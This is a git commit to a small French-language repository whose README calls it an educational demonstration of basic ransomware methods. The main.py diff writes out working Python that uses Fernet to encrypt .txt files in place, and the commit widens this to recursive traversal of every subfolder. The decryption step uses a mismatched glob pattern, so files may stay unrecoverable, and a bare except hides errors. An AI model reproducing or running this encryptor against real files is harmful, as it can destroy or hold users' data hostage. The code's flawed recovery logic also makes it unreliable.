989db7b9c7e5318eb848fdf4d08e2cf3384d481b
NLK666 <110420544+NLK666@users.noreply.github.com>
2026-02-12 10:00:48 +0100

    Update

--- README.md
+++ README.md
@@ -1,2 +1,14 @@
-# RSM-REPO
+## Ce script a pour but éducatif a apprendre les métohde utilise d'un ransomware de manière basique ##
 
+J'ai utiliser la librairie cryptography.fernet & gloabl.
+
+# 1st partie #
+Choix = input(" Choisisez votre mode 1 (Crypter) ou 2 pour (Déscrypter) : ")
+Laisse le choix a utilisateur de crypter ou décrypter !
+Selon le choix soit sela nous redirge a "if choix ==x"
+
+## Partie Génération Clef ##
+Laisse le choix a utilisateur de générer une clef ou de garder la même si elle existe !
+
+## Partie Encrypage ##
+Utilise le module Glob pour selectionner tout les fichier et avec extenssion dans le premier niveaux "*.txt" selon le choix 
--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 from cryptography.fernet import Fernet
 import glob
 
-Choix = input(" Choisisez votre mode 1 (Crypter) ou 2 pour (Déscrypter) : ")
+Choix = input(" Choisisez votre mode (1) pour Crypter (2) pour Décrypter : ")
 if Choix == "1" :
 
     ## Generation de la clef ##
@@ -12,24 +12,32 @@ if Choix == "1" :
         with open('key.key', 'wb') as f:
             f.write(user_key)
     else:
-        with open('key.key', 'rb') as f:
-            user_key = f.read()
+        try :
+            with open('key.key', 'rb') as f:
+                user_key = f.read() 
+        except :
+            pass
+        
+            
         
     ## Encryptage ##
-    files = glob.glob("*.txt")
-    for file in files:
-        with open(file, 'rb') as f:
-            data = f.read()
-        fernet = Fernet(user_key)
-        encrypted = fernet.encrypt(data)
-        with open(file, 'wb') as f:
-            f.write(encrypted)
+    try :
+        files = glob.glob("**/*.txt", recursive=True)
+        for file in files:
+            with open(file, 'rb') as f:
+                data = f.read()
+            fernet = Fernet(user_key)
+            encrypted = fernet.encrypt(data)
+            with open(file, 'wb') as f:
+                f.write(encrypted)
+    except :
+        print("Pas de clef déjà existante")
 
 ## Décryptage ##
 if Choix == "2" :
     decriptefil = input("Entrez la clef de décryptage : ")
 
-    file = glob.glob('*.txt')
+    file = glob.glob('*/**.txt', recursive=True)
     for files in file:
         with open(files, 'rb') as f:
             data = f.read()
